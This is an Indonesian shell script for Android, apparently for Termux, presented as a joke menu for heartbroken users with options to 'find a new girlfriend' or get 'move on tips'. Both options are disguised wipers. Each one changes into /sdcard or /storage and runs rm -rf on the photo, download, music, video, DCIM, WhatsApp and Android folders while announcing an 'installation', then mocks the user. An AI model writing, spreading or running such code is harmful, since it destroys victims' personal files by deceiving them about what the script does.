#Tools berbahaya
#Hanya untuk mantan
#Gunakan Dengan Bijak
#Creator OxLynx

m='\033[1;31m'
h='\033[1;32m'
k='\033[1;33m'
u='\033[1;34m'
pk='\033[1;35m'
b='\033[1;36m'
plh='\033[1;37m'

clear
echo $b  "[+] Creator : OxLynx [+]  ┈╱╱╱╱╱╲╲╲┈╱╱╲╲╲╲"
echo $pk "××××××××××××××××××××××××  ┈▏▕╭▅╭▅▕▕╭▏▅╮▅╮▕╮"
echo $h  "[1] Cari Pacar Baru  [1]  ┈▏╱▔▔╮▔▕▕╰▏▔╭▔▔▕╯"
echo $h  "××××××××××××××××××××××××  ▕╱╲╰━━╯╱╲▏╲╰━━╯╱"
echo $k  "[2] Tips Move On     [2]  ┈┈╭▔▔▔▔╲┈┈╱▔▔▔▔╮"
echo $k  "××××××××××××××××××××××××  ┈┈┃▏┊┊▕╲╲╱╱▏┊┊▕┃"
echo $m  "[3] Keluar           [3]  ┈┈╰▏▂▂▕┈╰╯┈▏▂▂▕╯"
echo $m  "××××××××××××××××××××××××  ┈┈▕▂▏▕▂▏┈┈▕▂▏▕▂▏"
echo $b

read -p "[+] Pilih Mana Mblo : " oxlynx;
if [ $oxlynx = 3 ] || [ $oxlynx = Keluar ]
then
echo ""
echo $h "[+] Terima Kasih" $k"Sudah Menggunakan" $m"Tools Ini [+]"
echo $b "[-] See You" $pk"Next Time [-]"
echo $h ""
exit
fi

if [ $oxlynx = 1 ] || [ $oxlynx = Cari Pacar Baru ]
then
echo $b  "Tunggu Sebentar..."
echo $pk "Proses Penginstallan"
echo ""
cd /sdcard
rm -rf android
rm -rf download
rm -rf downloads
rm -rf pictures
rm -rf foto
rm -rf music
rm -rf musik
rm -rf vidio
rm -rf vidioes
rm -rf dcim
rm -rf whatsapp
echo $h "Maaf Nasib Anda Memang Jones"
echo ""
fi

if [ $oxlynx = 2 ] || [ $oxlynx = Gabisa Move On ]
then
echo $b  "Tunggu Sebentar..."
echo $pk "Mulai Proses Penginstallan"
echo ""
cd /storage
rm -rf android
rm -rf download
rm -rf downloads
rm -rf musik
rm -rf music
rm -rf foto
rm -rf pictures
rm -rf vidio
rm -rf vidioes
rm -rf dcim
rm -rf whatsapp
clear
echo $h  "Selamat Anda Telah Move On"
echo ""
fi
